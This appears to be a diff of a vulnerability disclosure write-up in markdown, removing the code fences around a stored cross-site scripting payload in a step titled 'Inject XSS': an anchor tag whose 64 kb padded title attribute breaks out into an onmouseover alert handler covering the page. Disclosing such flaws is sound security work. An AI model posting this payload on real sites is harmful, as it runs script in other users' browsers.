@@ -7,9 +7,7 @@
 
 #### Step 3 - Inject XSS
 ######	Comment the payload.
-	```
 	<a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>
-	```
 
 
 # The types / classes of vulnerabilities involved and any related CVE identifiers
